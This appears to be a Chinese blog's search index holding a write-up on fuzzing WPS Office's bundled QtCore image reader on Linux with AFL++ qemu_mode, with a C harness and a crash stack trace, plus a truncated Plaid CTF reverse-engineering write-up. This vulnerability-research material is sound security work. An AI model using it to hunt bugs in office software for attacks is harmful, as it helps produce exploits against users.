<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>对wps的qtcore的某一接口fuzz</title>
    <link href="/2022/03/29/wps%20fuzz/"/>
    <url>/2022/03/29/wps%20fuzz/</url>
    
    <content type="html"><![CDATA[<p>主要看到以下三篇<code>blog</code></p><blockquote><p><a href="http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html">http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html</a><br><a href="https://www.anquanke.com/post/id/240938">https://www.anquanke.com/post/id/240938</a><br><a href="https://ruan777.github.io/2021/06/02/%E4%BD%BF%E7%94%A8winafl%E5%AF%B9qtcore%E7%9A%84%E4%B8%80%E6%AC%A1fuzz%E5%B0%9D%E8%AF%95">https://ruan777.github.io/2021/06/02/使用winafl对qtcore的一次fuzz尝试</a></p></blockquote><p>因此尝试对<code>linux</code>上的<code>wps</code>的<code>qtcore4</code>进行<code>fuzz</code></p><pre><code class="hljs yaml"><span class="hljs-string">环境：</span><span class="hljs-attr">linux:</span> <span class="hljs-string">ubuntu</span> <span class="hljs-number">20.04</span><span class="hljs-attr">wps:</span> <span class="hljs-number">11.1</span><span class="hljs-number">.0</span><span class="hljs-number">.10161</span><span class="hljs-attr">libcQtCore:</span> <span class="hljs-number">4.7</span><span class="hljs-number">.4</span></code></pre><h2 id="整体的逻辑"><a href="#整体的逻辑" class="headerlink" title="整体的逻辑"></a>整体的逻辑</h2><p>根据<code>Nafiez</code>的报告，可以知道，主要是<code>kso.dll</code>中调用<code>QtCore4.dll</code>的<code>QImageReader::read()</code>出错的，因此后续两篇文章均对于<code>QtCore4.dll</code>的该接口进行<code>fuzz</code></p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>:<span class="hljs-number">000</span>&gt; !heap -p -a cc<span class="hljs-number">53</span>afbc    <span class="hljs-attribute">address</span> cc<span class="hljs-number">53</span>afbc found in    <span class="hljs-attribute">_DPH_HEAP_ROOT</span> @ <span class="hljs-number">6731000</span>    <span class="hljs-attribute">in</span> busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)                                <span class="hljs-attribute">cc36323c</span>:         cc<span class="hljs-number">53</span>afa<span class="hljs-number">8</span>               <span class="hljs-number">58</span> -         cc<span class="hljs-number">53</span>a<span class="hljs-number">000</span>             <span class="hljs-number">2000</span>    <span class="hljs-attribute">6f13ab70</span> verifier!AVrfDebugPageHeapAllocate+<span class="hljs-number">0</span>x<span class="hljs-number">00000240</span>    <span class="hljs-attribute">77a9909b</span> ntdll!RtlDebugAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">00000039</span>    <span class="hljs-attribute">779ebbad</span> ntdll!RtlpAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>ed    <span class="hljs-attribute">779eb0cf</span> ntdll!RtlpAllocateHeapInternal+<span class="hljs-number">0</span>x<span class="hljs-number">0000022</span>f    <span class="hljs-attribute">779eae8e</span> ntdll!RtlAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">0000003</span>e    <span class="hljs-attribute">6f080269</span> MSVCR<span class="hljs-number">100</span>!malloc+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>b    <span class="hljs-attribute">6f08233b</span> MSVCR<span class="hljs-number">100</span>!operator new+<span class="hljs-number">0</span>x<span class="hljs-number">0000001</span>f    <span class="hljs-attribute">6b726c67</span> QtCore<span class="hljs-number">4</span>!QImageData::create+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>fa    <span class="hljs-attribute">6b726b54</span> QtCore<span class="hljs-number">4</span>!QImage::QImage+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>e    <span class="hljs-attribute">6b7a0e21</span> QtCore<span class="hljs-number">4</span>!png_get_text+<span class="hljs-number">0</span>x<span class="hljs-number">00000436</span>    <span class="hljs-attribute">6b79d7a8</span> QtCore<span class="hljs-number">4</span>!QImageIOHandler::setFormat+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>de    <span class="hljs-attribute">6b79d457</span> QtCore<span class="hljs-number">4</span>!QPixmapData::fromFile+<span class="hljs-number">0</span>x<span class="hljs-number">000002</span>bf    <span class="hljs-attribute">6b725eb4</span> QtCore<span class="hljs-number">4</span>!QImageReader::read+<span class="hljs-number">0</span>x<span class="hljs-number">000001</span>e<span class="hljs-number">2</span>    <span class="hljs-attribute">6d0ca585</span> kso!kpt::VariantImage::forceUpdateCacheImage+<span class="hljs-number">0</span>x<span class="hljs-number">0000254</span>e    <span class="hljs-attribute">6d0c5964</span> kso!kpt::Direct<span class="hljs-number">2</span>DPaintEngineHelper::operator=+<span class="hljs-number">0</span>x<span class="hljs-number">00000693</span>    <span class="hljs-attribute">6d0c70d0</span> kso!kpt::RelativeRect::unclipped+<span class="hljs-number">0</span>x<span class="hljs-number">00001146</span>    <span class="hljs-attribute">6d0c8d0c</span> kso!kpt::VariantImage::forceUpdateCacheImage+<span class="hljs-number">0</span>x<span class="hljs-number">00000</span>cd<span class="hljs-number">5</span>    <span class="hljs-attribute">6d451d5c</span> kso!BlipCacheMgr::BrushCache+<span class="hljs-number">0</span>x<span class="hljs-number">0000049</span>a    <span class="hljs-attribute">6d451e85</span> kso!BlipCacheMgr::GenerateBitmap+<span class="hljs-number">0</span>x<span class="hljs-number">0000001</span>d    <span class="hljs-attribute">6d453227</span> kso!BlipCacheMgr::GenCachedBitmap+<span class="hljs-number">0</span>x<span class="hljs-number">00000083</span>    <span class="hljs-attribute">6d29bb92</span> kso!drawing::PictureRenderLayer::render+<span class="hljs-number">0</span>x<span class="hljs-number">000009</span>b<span class="hljs-number">6</span>    <span class="hljs-attribute">6d450fb1</span> kso!drawing::RenderTargetImpl::paint+<span class="hljs-number">0</span>x<span class="hljs-number">00000090</span>    <span class="hljs-attribute">6d29b528</span> kso!drawing::PictureRenderLayer::render+<span class="hljs-number">0</span>x<span class="hljs-number">0000034</span>c    <span class="hljs-attribute">6d2a2d83</span> kso!drawing::VisualRenderer::render+<span class="hljs-number">0</span>x<span class="hljs-number">00000060</span>    <span class="hljs-attribute">6d2b8970</span> kso!drawing::SingleVisualRenderer::drawNormal+<span class="hljs-number">0</span>x<span class="hljs-number">000002</span>b<span class="hljs-number">5</span>    <span class="hljs-attribute">6d2b86a7</span> kso!drawing::SingleVisualRenderer::draw+<span class="hljs-number">0</span>x<span class="hljs-number">000001</span>e<span class="hljs-number">1</span>    <span class="hljs-attribute">6d2b945e</span> kso!drawing::SingleVisualRenderer::draw+<span class="hljs-number">0</span>x<span class="hljs-number">00000046</span>    <span class="hljs-attribute">6d3d0142</span> kso!drawing::ShapeVisual::paintEvent+<span class="hljs-number">0</span>x<span class="hljs-number">0000044</span>a    <span class="hljs-attribute">680a2b5c</span> wpsmain!WpsShapeTreeVisual::getHittestSubVisuals+<span class="hljs-number">0</span>x<span class="hljs-number">000068</span>f<span class="hljs-number">1</span>    <span class="hljs-attribute">6d0e36df</span> kso!AbstractVisual::visualEvent+<span class="hljs-number">0</span>x<span class="hljs-number">00000051</span>    <span class="hljs-attribute">6d3cbe97</span> kso!drawing::ShapeVisual::visualEvent+<span class="hljs-number">0</span>x<span class="hljs-number">0000018</span>f    <span class="hljs-attribute">6d0eba90</span> kso!VisualPaintEvent::arriveVisual+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>e</code></pre><p>后续两篇文章<code>fuzz</code>的代码逻辑为</p><pre><code class="hljs maxima">QImage <span class="hljs-built_in">image</span>;QImageReader reader;QString image_file_name;# <span class="hljs-built_in">transform</span> (char[] <span class="hljs-built_in">file_name</span>) to (QString image_file_name)reader.setFileName(image_file_name)reader.<span class="hljs-built_in">read</span>(<span class="hljs-built_in">image</span>);</code></pre><h2 id="从windows到linux"><a href="#从windows到linux" class="headerlink" title="从windows到linux"></a>从windows到linux</h2><p>在迁移的时候，就去找了一下对应的<code>libQtCore.so.4.7.4</code>的接口，得到了以下的代码</p><pre><code class="hljs c"><span class="hljs-comment">// gcc -g -masm=intel ./qt_reader.c -ldl -no-pie -o qt_reader</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;dlfcn.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;    dlopen(<span class="hljs-string">&quot;/path/libc++.so.1&quot;</span>, RTLD_LAZY);    dlopen(<span class="hljs-string">&quot;/path/libpng12.so.0&quot;</span>, RTLD_LAZY);    dlopen(<span class="hljs-string">&quot;/path/libc++abi.so.1&quot;</span>, RTLD_LAZY);    <span class="hljs-keyword">void</span>* handle = dlopen(<span class="hljs-string">&quot;/path/libQtCore.so.4.7.4&quot;</span>, RTLD_LAZY);    <span class="hljs-keyword">if</span> (handle == <span class="hljs-number">0</span>)    &#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;open handle failed&quot;</span>);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, dlerror());        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;        <span class="hljs-comment">// QImageReader::QImageReader(QImageReader *this)</span>    <span class="hljs-keyword">void</span> (*qt_qimageReader)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReaderC2Ev&quot;</span>);    <span class="hljs-comment">// QImageReader::read(QImageReader *this, QImage *a2)</span>    <span class="hljs-keyword">void</span> (*qt_qimageReader_read)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReader4readEP6QImage&quot;</span>);    <span class="hljs-comment">// QImageReader::setFileName(QImageReader *this, const QString *a2)</span>    <span class="hljs-keyword">void</span> (*qt_setFileName)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReader11setFileNameERK7QString&quot;</span>);    <span class="hljs-comment">// QString::QString(QString *this, const QChar *)</span>    <span class="hljs-keyword">void</span> (*qt_qstring)() = dlsym(handle, <span class="hljs-string">&quot;_ZN7QStringC2EPK5QChar&quot;</span>);    <span class="hljs-comment">// QString::fromLatin1(QString *this, const char *, unsigned int)</span>    <span class="hljs-keyword">void</span> (*qt_qstring_fromlatin1)() = dlsym(handle, <span class="hljs-string">&quot;_ZN7QString10fromLatin1EPKci&quot;</span>);    <span class="hljs-comment">// QImage::QImage(QImage *this)</span>    <span class="hljs-keyword">void</span> (*qt_qimage)() = dlsym(handle, <span class="hljs-string">&quot;_ZN6QImageC2Ev&quot;</span>);    <span class="hljs-comment">// QFile::exists(QFile *__hidden this)</span>    <span class="hljs-keyword">void</span> (*qt_qfile_exits)() = dlsym(handle, <span class="hljs-string">&quot;_ZNK5QFile6existsEv&quot;</span>);    <span class="hljs-comment">// QFile::close()</span>    <span class="hljs-keyword">void</span> (*qt_close)() = dlsym(handle, <span class="hljs-string">&quot;_ZN5QFile5closeEv&quot;</span>);    <span class="hljs-keyword">char</span>* image = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<span class="hljs-keyword">char</span>* qstring = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<span class="hljs-keyword">char</span>* reader = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);    <span class="hljs-keyword">char</span>* file_name = argv[<span class="hljs-number">1</span>];    <span class="hljs-comment">// pusha</span>    __asm__ __volatile__(        <span class="hljs-string">&quot;push rax\n&quot;</span>        <span class="hljs-string">&quot;push rbx\n&quot;</span>        <span class="hljs-string">&quot;push rcx\n&quot;</span>          <span class="hljs-string">&quot;push rdx\n&quot;</span>              <span class="hljs-string">&quot;push rbp\n&quot;</span>              <span class="hljs-string">&quot;push rdi\n&quot;</span>              <span class="hljs-string">&quot;push rsi\n&quot;</span>              <span class="hljs-string">&quot;push r8\n&quot;</span>              <span class="hljs-string">&quot;push r9\n&quot;</span>              <span class="hljs-string">&quot;push r10\n&quot;</span>              <span class="hljs-string">&quot;push r11\n&quot;</span>              <span class="hljs-string">&quot;push r12\n&quot;</span>              <span class="hljs-string">&quot;push r13\n&quot;</span>              <span class="hljs-string">&quot;push r14\n&quot;</span>              <span class="hljs-string">&quot;push r15\n&quot;</span>        <span class="hljs-string">&quot;push r15\n&quot;</span>);    <span class="hljs-comment">// QImage::QImage(image)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(image), <span class="hljs-string">&quot;a&quot;</span>(qt_qimage)    );        <span class="hljs-comment">// QImageReader::QImageReader(reader)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_qimageReader)    );    <span class="hljs-comment">// **************** This is a wrong interface of transforming the char to QString ***********************</span>    <span class="hljs-comment">// // QString::QString(qstring, file_name)</span>    <span class="hljs-comment">// __asm__ __volatile__ (</span>    <span class="hljs-comment">//     &quot;call rax\n&quot;</span>    <span class="hljs-comment">//     :</span>    <span class="hljs-comment">//     : &quot;D&quot;(qstring), &quot;S&quot;(file_name), &quot;a&quot;(qt_qstring)</span>    <span class="hljs-comment">// );</span>    <span class="hljs-comment">// QString::fromLatin1(QString *this, const char *, unsigned int)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(qstring), <span class="hljs-string">&quot;S&quot;</span>(file_name), <span class="hljs-string">&quot;d&quot;</span>(<span class="hljs-built_in">strlen</span>(file_name)), <span class="hljs-string">&quot;a&quot;</span>(qt_qstring_fromlatin1)    );    <span class="hljs-comment">// QImageReader::setFileName(reader, qstring)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;S&quot;</span>(qstring), <span class="hljs-string">&quot;a&quot;</span>(qt_setFileName)    );    <span class="hljs-comment">// QFile::exits(qfile) qfile = reader+0x10</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;mov rsi, [rdi]\n&quot;</span>        <span class="hljs-string">&quot;mov rdi, [rsi+0x10]\n&quot;</span>        <span class="hljs-string">&quot;call rax\n&quot;</span>        <span class="hljs-string">&quot;test al, al\n&quot;</span>        <span class="hljs-string">&quot;je error\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_qfile_exits)    );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;file exists&quot;</span>);    <span class="hljs-comment">// QImageReader::read(reader, qimage)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;S&quot;</span>(image), <span class="hljs-string">&quot;a&quot;</span>(qt_qimageReader_read)    );        <span class="hljs-comment">// QFile::close()</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;mov rsi, [rdi]\n&quot;</span>        <span class="hljs-string">&quot;mov rdi, [rsi+0x10]\n&quot;</span>        <span class="hljs-string">&quot;call rax\n&quot;</span>        <span class="hljs-string">&quot;jmp out\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_close)    );    <span class="hljs-comment">// error:</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;error:\n&quot;</span>    );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error: file not exists&quot;</span>);    <span class="hljs-comment">// popa</span>    __asm__ __volatile__(        <span class="hljs-string">&quot;out:\n&quot;</span>        <span class="hljs-string">&quot;pop r15\n&quot;</span>        <span class="hljs-string">&quot;pop r15\n&quot;</span>        <span class="hljs-string">&quot;pop r14\n&quot;</span>        <span class="hljs-string">&quot;pop r13\n&quot;</span>        <span class="hljs-string">&quot;pop r12\n&quot;</span>        <span class="hljs-string">&quot;pop r11\n&quot;</span>        <span class="hljs-string">&quot;pop r10\n&quot;</span>        <span class="hljs-string">&quot;pop r9\n&quot;</span>        <span class="hljs-string">&quot;pop r8\n&quot;</span>        <span class="hljs-string">&quot;pop rsi\n&quot;</span>        <span class="hljs-string">&quot;pop rdi\n&quot;</span>        <span class="hljs-string">&quot;pop rbp\n&quot;</span>        <span class="hljs-string">&quot;pop rdx\n&quot;</span>        <span class="hljs-string">&quot;pop rcx\n&quot;</span>        <span class="hljs-string">&quot;pop rbx\n&quot;</span>        <span class="hljs-string">&quot;pop rax\n&quot;</span>        );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>这个地方，最开始写的时候，撸了一版跟后两篇一样的接口的代码，但是发现覆盖率并没有上升，最后调的时候，发现在<code>reader.read()</code>的第一次判断支持的文件格式（<code>bmp, png, jpg ...</code>）以及文件是否存在时，就发现程序自身就走到了<code>File Not found</code>的地方</p><p>无奈只能重新调试程序，最后找到了一个<code>QFile::exists()</code>接口，调试的时候，发现<code>QFile</code>中存储的路径的<code>QString</code>跟我用<code>QString::QString()</code>的数据结构并不一致，就换了一个<code>QString::fromLatin1()</code>接口，就能成功地跑起来了</p><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>在写好板子之后就想要用<code>afl</code>的<code>qemu_mode</code>进行插桩<code>fuzz</code>，折腾了半天，感觉<code>afl</code>原本的<code>qemu</code>版本以及<code>patch</code>和<code>libc</code>的接口都太老了</p><p>最后听学长的直接整<code>afl++</code>的<code>qemu_mode</code></p><p>最初<code>fuzz</code>起来的时候，并没过多的设置，但是这样的话是全插桩，像<code>dlopen</code>的一些库都是不关心以及没必要的，而且在<code>afl++</code>的窗口也看的出来，基本上覆盖率都是不上升的，而且极低（0.10%）</p><p>利用<code>./afl-qemu-trace -D 1.txt -d exec,nochain ./qt_reader /tmp/1.png</code>记录下来<code>trace</code>，发现不同文件的<code>trace</code>差距还是很明显的，说明代码并没有写崩</p><p>最后利用<code>export AFL_INST_LIBS=1</code>给库函数也插桩之后就可以跑起来了</p><p>另外也可以通过<code>AFL_QEMU_INST_RANGES</code>设置<code>range</code>，进行范围的插桩，通过以下代码获取相关<code>.so</code>的内存地址范围</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">lm</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">link_map</span>*)<span class="hljs-title">handle</span>;</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;base:%p\n&quot;</span>, lm-&gt;l_addr);</code></pre><p>另外翻了一下<code>afl</code>的源码，可以看到如果<code>cur_loc &gt;= afl_inst_rms</code>则<code>return</code>，所以如果给库插桩还是要注意是否超过了<code>MAP_SIZE</code>，否则最后的比较关心的<code>.so</code>没插桩上</p><pre><code class="hljs c"><span class="hljs-comment">/* Instrumentation ratio: */</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> afl_inst_rms = MAP_SIZE;<span class="hljs-comment">/* The equivalent of the tuple logging routine from afl-as.h. */</span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afl_maybe_log</span><span class="hljs-params">(abi_ulong cur_loc)</span> </span>&#123;  <span class="hljs-keyword">static</span> __thread abi_ulong prev_loc;  <span class="hljs-comment">/* Optimize for cur_loc &gt; afl_end_code, which is the most likely case on</span><span class="hljs-comment">     Linux systems. */</span>  <span class="hljs-keyword">if</span> (cur_loc &gt; afl_end_code || cur_loc &lt; afl_start_code || !afl_area_ptr)    <span class="hljs-keyword">return</span>;  <span class="hljs-comment">/* Looks like QEMU always maps to fixed locations, so ASAN is not a</span><span class="hljs-comment">     concern. Phew. But instruction addresses may be aligned. Let&#x27;s mangle</span><span class="hljs-comment">     the value to get something quasi-uniform. */</span>  cur_loc  = (cur_loc &gt;&gt; <span class="hljs-number">4</span>) ^ (cur_loc &lt;&lt; <span class="hljs-number">8</span>);  cur_loc &amp;= MAP_SIZE - <span class="hljs-number">1</span>;  <span class="hljs-comment">/* Implement probabilistic instrumentation by looking at scrambled block</span><span class="hljs-comment">     address. This keeps the instrumented locations stable across runs. */</span>  <span class="hljs-keyword">if</span> (cur_loc &gt;= afl_inst_rms) <span class="hljs-keyword">return</span>;  afl_area_ptr[cur_loc ^ prev_loc]++;  prev_loc = cur_loc &gt;&gt; <span class="hljs-number">1</span>;&#125;</code></pre><h2 id="其他-踩坑"><a href="#其他-踩坑" class="headerlink" title="其他 踩坑"></a>其他 <del>踩坑</del></h2><h3 id="reader-setFileName"><a href="#reader-setFileName" class="headerlink" title="reader.setFileName"></a>reader.setFileName</h3><p>一开始我想去找<code>houjingyi</code>师傅是如何得到<code>reader.setFileName</code>接口在<code>reader.read()</code>之前被调用了的，因此我去尝试调试<code>linux</code>下的<code>wpsoffice</code>打开<code>docx</code>的操作</p><p>在<code>wpsoffice</code>最初并未加载<code>libQtCore.so.4.7.4</code>时，给<code>pthread_create</code>下断点，<code>continue</code>之后再给<code>libQtCore.so.4.7.4</code>中的<code>QImageReader.read()</code>和<code>QImageReader.setFileName()</code>下断点，但是其实最后并没有很明显的看出来，在调用<code>reader.read()</code>之前调用了<code>reader.setFileName()</code></p><p>最后去询问<code>houjingyi</code>师傅，才知道，师傅是直接根据程序代码逻辑，认为<code>reader.read()</code>之前肯定有对于设置图片路径<code>reader.setFileName()</code>的操作（感觉自己的思维有点局限了，老是想明明白白调出来调用的接口和顺序，实际上全然没管开发者在开发时候的代码逻辑）</p><p>P.S. 说起来，调试 <code>wpsoffice</code> 的程序的时候，觉得特别神奇，<code>wpsoffice</code>会运行<strong>两次</strong><code>_start</code>，在第一次<code>_start</code>的时候，可以看到<code>wpsoffice</code>在加载自己的程序的窗口，在第一次<code>_start</code>的最后会<code>jmp</code>第二次的<code>_start</code>，第二次的<code>wps</code>窗口，显示正在加载<code>docx</code>文件，因此当时我调试的时候，猜测第一次<code>_start</code>的时候，是在利用<code>QtCore</code>加载自己窗口，而第二次才是渲染解析<code>docx</code>文件，但是最后还是没调出来</p><h3 id="QString-QString"><a href="#QString-QString" class="headerlink" title="QString::QString"></a>QString::QString</h3><p>这个接口转换出来的并不是<code>QString</code>坑了我一段时间，最后找到<code>QFile::exists()</code>接口的时候，才发现，<code>QString::QString</code>转换出来的不是<code>QString</code></p><h3 id="AFL-INST-LIBS-AFL-QEMU-INST-RANGES"><a href="#AFL-INST-LIBS-AFL-QEMU-INST-RANGES" class="headerlink" title="AFL_INST_LIBS AFL_QEMU_INST_RANGES"></a>AFL_INST_LIBS AFL_QEMU_INST_RANGES</h3><p>不设置这两个的话，是不会给<code>dlopen</code>打开的库函数插桩的</p><h3 id="fuzz-断掉继续跑"><a href="#fuzz-断掉继续跑" class="headerlink" title="fuzz 断掉继续跑"></a>fuzz 断掉继续跑</h3><p>设置输入参数为<code>-i-</code> ，就可以读入 <code>fuzz_out/default/_resume</code>中的内容，继续跑</p><h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><p>顺手试了一波<code>Qt5.12.9</code>，最后跑的时候，是出现了<code>WARNING: Instrumentation output varies across runs.</code>，发现是出现了<code>ASLR</code>的情况，照理来说<code>qemu</code>应该不会出现这种情况，但是怎么解决，不太清楚</p><p>另外试了一下<code>qasan</code>也无法进行插桩检测，感觉还得再整整</p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>afl++</tag>
      
      <tag>qemu_mode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Plaid CTF dr</title>
    <link href="/2021/05/10/Plaid%20CTF%20dr/"/>
    <url>/2021/05/10/Plaid%20CTF%20dr/</url>
    
    <content type="html"><![CDATA[<p>打比赛的时候，后面一直在看<code>dr</code>这个题，把大概逻辑逆清楚（<del>后来发现逆向一点用都没，感觉还不如猜呢，tcl，rust逆的很慢</del>），一开始觉得有点类似自动机，后面发现是正则之后，巨神两个小时就秒了（tql</p><p>拖了很久才来复现，稍微记录一下，免得之后忘记了</p><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p> 虽然是 rust 写的，但是程序逻辑比较简单，可以分为三部分，前面第一部分和第三部分都是定死的字符串 “3” 和 “yes”</p><p>第二部分输入的时候会出现一些奇怪的东西，到后面可以发现第二部分算是第四部分的提示</p><p>第二部分输入的是症状，第四部分是输入key，输入症状时，会出现类似自动机吃字符然后出现状态转换的提示，在这部分可以猜到一些最基本的符号表示，同时不同的症状需要的治病的费用不同，对后续的第四部分也会造成影响</p><p>第四部分输入key之后，会进行接受，并在最后将输入的内容和写在bss段的字符列表进行处理之后得到flag</p><h2 id="正则分析"><a href="#正则分析" class="headerlink" title="正则分析"></a>正则分析</h2><p>通过猜名字和对于不同的输入和提示的返回可以得到以下的分析结果</p><pre><code class="hljs"><span class="hljs-attribute">And</span>: 满足Res中所有的要求<span class="hljs-attribute">Alt</span>: 满足Res中其中一个要求<span class="hljs-attribute">Seq</span>: 正则需要满足的序列<span class="hljs-attribute">Lit</span>: 一个一个匹配，字面量<span class="hljs-attribute">Res</span>: 数组<span class="hljs-attribute">Star</span>: 匹配0个或者多个<span class="hljs-attribute">Eps</span>: epsilon<span class="hljs-attribute">Neg(Null)</span>: 匹配任意长度的<span class="hljs-attribute">Neg:</span>    10c -&gt; 10ca    Neg( ... Alt(Res([Lit(&quot;af&quot;)])) ...) -&gt; Neg( ... Alt(Res([Lit(&quot;f&quot;)])) ... )    应该是禁止出现 af 的意思        尝试 10caf 也失效了<span class="hljs-attribute">Consider</span>:     1: 1,7777,73331         0*16+1    10: 16,7777,73331       (0*16+1)*16+0        100: 256,7777,73331     ((0*16+1)*16+0)*16+0    10c: 268,7777,73331     ((0*16+1)*16+0)*16+0xc    %733331    相当于 Consider(Res([])) 的个数进制<span class="hljs-attribute">Moon</span>:     1: Moon([0-9],2,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    10: Moon([0-9],3,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    100: Moon([0-9],1,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    10c: Moon([a-f],3,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)        相当于在算个数，如果个数相等了，这个 Moon 可以结束进入下一个    100c 这个c就吃不进去，因为第一项是 Moon([0-9], 1, 3)<span class="hljs-attribute">Fan:</span>    10: Neg(.. Fan([a-f], 6) ..)    10b: Neg(.. Fan([a-f], 5) ..)    倒数计数</code></pre><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>最后对照输入<code>1</code>之后的正则提示，可以分析得到以下的结果</p><pre><code class="hljs lsl"><span class="hljs-number">1.</span> Neg(Null) + Consider( [bcd], Lit(<span class="hljs-string">&quot;cdb&quot;</span>)+Neg(bd) ], <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  字符串 []cdb 或者 cdb[] 且不能为 cdbb cdbd<span class="hljs-number">2.</span> *[<span class="hljs-number">1</span><span class="hljs-number">-3</span>] + (*[<span class="hljs-number">3</span><span class="hljs-number">-7</span>] + Neg(Null))                                <span class="hljs-number">3.</span> Consider( [<span class="hljs-number">05</span>a], [<span class="hljs-number">16</span>b], [<span class="hljs-number">27</span>cf], [<span class="hljs-number">38</span>dx], [<span class="hljs-number">49</span>e], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span> )     算法需要 最后 %<span class="hljs-number">7</span> == <span class="hljs-number">0</span><span class="hljs-number">4.</span> Moon([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">1</span>, <span class="hljs-number">3</span>) + Moon([a-f], <span class="hljs-number">2</span>, <span class="hljs-number">3</span>) + Moon( Moon([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">1</span>, <span class="hljs-number">3</span>), Moon([a-f], <span class="hljs-number">2</span>, <span class="hljs-number">3</span>), <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)    需要 数字(<span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">8.</span>..)+字符(<span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">7.</span>..)+数字(<span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">8.</span>..)+字符(<span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">7.</span>..) <span class="hljs-number">5.</span> Moon(Lit(<span class="hljs-string">&quot;10&quot;</span>), <span class="hljs-number">0</span>, <span class="hljs-number">3</span>)                                        <span class="hljs-number">10</span>需要出现<span class="hljs-number">3</span>次<span class="hljs-number">6.</span> Neg( 